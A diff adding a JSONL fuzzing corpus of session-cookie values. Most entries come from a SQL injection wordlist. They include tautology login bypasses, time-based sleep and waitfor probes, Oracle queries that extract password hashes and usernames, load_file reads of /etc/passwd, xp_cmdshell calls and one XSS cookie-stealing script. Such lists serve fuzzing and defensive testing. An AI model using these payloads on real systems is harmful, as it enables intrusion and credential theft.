@@ -1,0 +1,287 @@
+{"count":2,"src":"fuzzdb-sqli","value":"sid=' or '1'='1"}
+{"value":"sid=' or 1=1--","src":"fuzzdb-sqli","count":2}
+{"count":2,"value":"sid=1 or 1=1","src":"fuzzdb-sqli"}
+{"src":"synthetic","value":"pref=<script>alert(document.cookie)</script>","count":1}
+{"value":"sessionid=sqlmap/1.7-dev; path=/","src":"synthetic","count":1}
+{"count":1,"value":"sid= or 0=0 #\"","src":"fuzzdb-sqli"}
+{"value":"sid= or 1=1 or \"\"=","src":"fuzzdb-sqli","count":1}
+{"value":"sid= or a = a","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid= or a=a","src":"fuzzdb-sqli"}
+{"value":"sid= or isNULL(1/0) /*","src":"fuzzdb-sqli","count":1}
+{"value":"sid=!","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=\" or \"a\"=\"a"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=\" or 0=0 --"}
+{"count":1,"value":"sid=\" or 1=1--","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=\" or benchmark(10000000,MD5(1))#","src":"fuzzdb-sqli"}
+{"value":"sid=\" or isNULL(1/0) /*","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=\" or sleep(__TIME__)#","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=\" or sleep(__TIME__)=\""}
+{"src":"fuzzdb-sqli","value":"sid=\") or benchmark(10000000,MD5(1))#","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=\") or sleep(__TIME__)=\""}
+{"src":"fuzzdb-sqli","value":"sid=\")) or benchmark(10000000,MD5(1))#","count":1}
+{"value":"sid=\")) or sleep(__TIME__)=\"","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=\"));waitfor delay '0:0:__TIME__'--"}
+{"value":"sid=\");waitfor delay '0:0:__TIME__'--","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=\";waitfor delay '0:0:__TIME__'--"}
+{"src":"fuzzdb-sqli","value":"sid=\"a\"\" or 1=1--\"","count":1}
+{"src":"fuzzdb-sqli","value":"sid=\"a\"\" or 3=3--\"","count":1}
+{"value":"sid=\"hi\"\") or (\"\"a\"\"=\"\"a\"","src":"fuzzdb-sqli","count":1}
+{"value":"sid=%20$(sleep%2050)","src":"fuzzdb-sqli","count":1}
+{"value":"sid=%20'sleep%2050'","src":"fuzzdb-sqli","count":1}
+{"value":"sid=%20or%20x=x","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=%21"}
+{"count":1,"value":"sid=%26","src":"fuzzdb-sqli"}
+{"value":"sid=%27%20or%201=1","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=%28","count":1}
+{"value":"sid=%29","src":"fuzzdb-sqli","count":1}
+{"value":"sid=%2A%28%7C%28mail%3D%2A%29%29","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=%2A%28%7C%28objectclass%3D%2A%29%29","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=%2A%7C"}
+{"src":"fuzzdb-sqli","value":"sid=%7C","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=&"}
+{"value":"sid=&apos;%20OR","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid='"}
+{"value":"sid=' (select top 1","src":"fuzzdb-sqli","count":1}
+{"value":"sid=' --","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' -- &password=","src":"fuzzdb-sqli"}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(GRANTED_ROLE)) FROM DBA_ROLE_PRIVS WHERE GRANTEE=SYS.LOGIN_USER)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(PASSWORD)) FROM SYS.USER$)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(USERNAME)) FROM SYS.ALL_USERS)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(column_name)) FROM sys.all_tab_columns)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT COUNT(DISTINCT(table_name)) FROM sys.all_tables)) AND 'i'='i","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=1)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=2)) AND 'i'='i","count":1}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=3)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=4)) AND 'i'='i"}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=5)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=6)) AND 'i'='i","count":1}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=1)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=2)) AND 'i'='i"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=3)) AND 'i'='i","count":1}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=4)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=5)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=6)) AND 'i'='i","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=1)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=2)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=3)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=4)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=5)) AND 'i'='i","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=6)) AND 'i'='i"}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=1)) AND 'i'='i"}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=2)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=3)) AND 'i'='i"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=4)) AND 'i'='i"}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=5)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i","count":1}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=1)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=2)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=3)) AND 'i'='i"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=4)) AND 'i'='i"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=5)) AND 'i'='i"}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=6)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i"}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT SYS.DATABASE_NAME FROM DUAL)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT SYS.LOGIN_USER FROM DUAL)) AND 'i'='i","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT banner FROM v$version WHERE ROWNUM=1)) AND 'i'='i","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT global_name FROM global_name)) AND 'i'='i"}
+{"value":"sid=' AND 1=utl_inaddr.get_host_address((SELECT host_name FROM v$instance)) AND 'i'='i","src":"fuzzdb-sqli","count":1}
+{"value":"sid=' UNION ALL SELECT","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' UNION SELECT"}
+{"value":"sid=' and 1 in (select var from temp)--","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));"}
+{"count":1,"value":"sid=' group by userid having 1=1--","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=' having 1=1--","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' or ''='","count":1}
+{"count":1,"value":"sid=' or '1'='1'--","src":"fuzzdb-sqli"}
+{"value":"sid=' or '7659'='7659","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' or 'a'='a","count":1}
+{"value":"sid=' or 'something' = 'some'+'thing'","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' or 'something' like 'some%'","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' or 'text' = n'text'","count":1}
+{"count":1,"value":"sid=' or 'text' > 't'","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=' or 'unusual' = 'unusual'","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' or 'whatever' in ('whatever')"}
+{"count":1,"value":"sid=' or (EXISTS)","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=' or 0=0 #","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' or 0=0 --"}
+{"value":"sid=' or 1 --'","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' or 1 in (select @@version)--","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' or 1/*"}
+{"count":1,"value":"sid=' or 1=1","src":"fuzzdb-sqli"}
+{"value":"sid=' or 1=1 /*","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' or 1=1 or ''='","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' or 2 > 1","count":1}
+{"value":"sid=' or 2 between 1 and 3","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' or 3=3","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=' or a=a--","count":1}
+{"count":1,"value":"sid=' or benchmark(10000000,MD5(1))#","src":"fuzzdb-sqli"}
+{"value":"sid=' or sleep(__TIME__)#","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' or sleep(__TIME__)='","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' or uid like '%"}
+{"src":"fuzzdb-sqli","value":"sid=' or uname like '%","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' or user like '%","count":1}
+{"count":1,"value":"sid=' or userid like '%","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' or username like '%"}
+{"value":"sid=' or username like char(37);","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' select * from information_schema.tables--","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=' select name from syscolumns where id = (select id from sysobjects where name = tablename')--"}
+{"value":"sid=' union all select @@version--","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=' union select","count":1}
+{"value":"sid=' union select * from users where login = char(114,111,111,116);","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=' union select 1,load_file('/etc/passwd'),1,1,1;","src":"fuzzdb-sqli"}
+{"value":"sid=' || myappadmin.adduser('admin', 'newpass') || '","src":"fuzzdb-sqli","count":1}
+{"value":"sid='%20or%20''='","src":"fuzzdb-sqli","count":1}
+{"value":"sid='%20or%20'x'='x","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid='%20or%201=1","count":1}
+{"src":"fuzzdb-sqli","value":"sid=') or ('a'='a","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=') or benchmark(10000000,MD5(1))#"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=') or sleep(__TIME__)='"}
+{"src":"fuzzdb-sqli","value":"sid=')%20or%20('x'='x","count":1}
+{"value":"sid=')) or benchmark(10000000,MD5(1))#","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=')) or sleep(__TIME__)='"}
+{"count":1,"value":"sid='));waitfor delay '0:0:__TIME__'--","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=');waitfor delay '0:0:__TIME__'--"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid='+sqlvuln"}
+{"count":1,"value":"sid='/**/or/**/1/**/=/**/1","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid='; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login >","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid='; exec ('sel' + 'ect us' + 'er')"}
+{"src":"fuzzdb-sqli","value":"sid='; exec master..xp_cmdshell","count":1}
+{"count":1,"value":"sid='; exec master..xp_cmdshell 'ping 172.10.1.255'--","src":"fuzzdb-sqli"}
+{"value":"sid='; exec xp_regread","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid='; execute immediate 'sel' || 'ect us' || 'er'"}
+{"count":1,"value":"sid=';waitfor delay '0:0:__TIME__'--","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid='hi' or 'x'='x';","src":"fuzzdb-sqli"}
+{"value":"sid='sqlattempt1","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid='sqlvuln","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid='||'6"}
+{"value":"sid='||(elt(-3+5,bin(15),ord(10),hex(char(45))))","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid='||UTL_HTTP.REQUEST","count":1}
+{"count":1,"value":"sid='||utl_http.request('httP://192.168.1.1/')||'","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=(","count":1}
+{"src":"fuzzdb-sqli","value":"sid=(sqlattempt2)","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=(sqlvuln)"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=(||6)"}
+{"src":"fuzzdb-sqli","value":"sid=)","count":1}
+{"count":1,"value":"sid=) or (a=a","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=) union select * from information_schema.tables;","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=));waitfor delay '0:0:__TIME__'--"}
+{"count":1,"value":"sid=);waitfor delay '0:0:__TIME__'--","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=*(|(mail=*))","count":1}
+{"value":"sid=*(|(objectclass=*))","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=*/*","count":1}
+{"count":1,"value":"sid=*|","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=,@variable","count":1}
+{"count":1,"value":"sid=--sp_password","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=/","count":1}
+{"src":"fuzzdb-sqli","value":"sid=//","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=//*"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=0"}
+{"count":1,"value":"sid=0 or 1=1","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=031003000270000"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A"}
+{"src":"fuzzdb-sqli","value":"sid=0x77616974666F722064656C61792027303A303A31302700 exec(@s)","count":1}
+{"count":1,"value":"sid=1 and 1=1","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=1 exec sp_ (or exec xp_)","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=1 or benchmark(10000000,MD5(1))#"}
+{"src":"fuzzdb-sqli","value":"sid=1 or sleep(__TIME__)#","count":1}
+{"count":1,"value":"sid=1 waitfor delay '0:0:10'--","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=1' and 1=(select count(*) from tablenames); --","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=1' or '1'='1"}
+{"value":"sid=1'1","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=1'or'1'='1"}
+{"src":"fuzzdb-sqli","value":"sid=1) or benchmark(10000000,MD5(1))#","count":1}
+{"src":"fuzzdb-sqli","value":"sid=1) or sleep(__TIME__)#","count":1}
+{"count":1,"value":"sid=1)) or benchmark(10000000,MD5(1))#","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=1)) or sleep(__TIME__)#","src":"fuzzdb-sqli"}
+{"value":"sid=1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;","src":"fuzzdb-sqli","count":1}
+{"value":"sid=1;SELECT%20*","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=1or1=1"}
+{"src":"fuzzdb-sqli","value":"sid=23 OR 1=1","count":1}
+{"src":"fuzzdb-sqli","value":"sid=; or '1'='1'","count":1}
+{"count":1,"value":"sid=;waitfor delay '0:0:__TIME__'--","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=<>\"'%;)(&+"}
+{"src":"fuzzdb-sqli","value":"sid=?","count":1}
+{"value":"sid=@var select @var as var into temp end --","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=@variable"}
+{"count":1,"value":"sid=PRINT","src":"fuzzdb-sqli"}
+{"value":"sid=PRINT @@variable","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=\\x27UNION SELECT","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=a'","count":1}
+{"count":1,"value":"sid=a' or 'a' = 'a","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=a' or 1=1--"}
+{"value":"sid=a' or 3=3--","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=a' waitfor delay '0:0:10'--","count":1}
+{"value":"sid=admin' or '","src":"fuzzdb-sqli","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=anything' OR 'x'='x"}
+{"value":"sid=as","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=asc","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=benchmark(10000000,MD5(1))#","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=bfilename"}
+{"value":"sid=char%4039%41%2b%40SELECT","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)","count":1}
+{"value":"sid=declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=declare @q nvarchar (4000) select @q =","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)","count":1}
+{"src":"fuzzdb-sqli","value":"sid=declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)"}
+{"value":"sid=declare @s varchar(22) select @s =","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=delete","src":"fuzzdb-sqli"}
+{"value":"sid=desc","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=distinct","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=exec sp"}
+{"src":"fuzzdb-sqli","value":"sid=exec xp","count":1}
+{"count":1,"value":"sid=exec(@s)","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=fake@ema'or'il.nl'='il.nl","src":"fuzzdb-sqli"}
+{"value":"sid=handler","src":"fuzzdb-sqli","count":1}
+{"count":1,"value":"sid=having","src":"fuzzdb-sqli"}
+{"count":1,"value":"sid=hi or 1=1 --\"","src":"fuzzdb-sqli"}
+{"src":"fuzzdb-sqli","value":"sid=hi or a=a","count":1}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=hi' or 'a'='a"}
+{"count":1,"value":"sid=hi' or 1=1 --","src":"fuzzdb-sqli"}
+{"count":1,"src":"fuzzdb-sqli","value":"sid=hi') or ('a'='a"}
+{"src":"fuzzdb-sqli","value":"sid=insert","count":1}
+{"value":"sid=like","src":"fuzzdb-sqli","count":1}
+{"value":"sid=limit","src":"fuzzdb-sqli","count":1}
+{"value":"sid=or","src":"fuzzdb-sqli","count":1}
+{"src":"fuzzdb-sqli","value":"sid=or 0=0 #","count":1}
+{"src":"fuzzdb-sqli","value":"sid=or 0=0 --","count":1}
